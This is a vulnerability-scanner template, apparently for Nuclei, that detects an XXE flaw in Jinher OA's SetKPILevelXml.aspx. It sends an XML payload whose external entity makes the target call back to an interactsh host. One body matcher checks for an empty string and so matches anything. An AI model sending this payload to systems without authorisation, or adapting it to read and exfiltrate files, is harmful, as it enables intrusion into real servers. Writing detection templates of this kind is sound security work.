id: poc-yaml-jinher-setkpilevelxml-aspx-xxe
info:
  name: JinheOA SetKPILevelXml.aspx XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,DNSLOG
http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body
  - raw:
      - |
        POST /c6/Jhsoft.Web.Appraise/SetKPILevelXml.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe_test">
        %remote;]>
        <root/>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
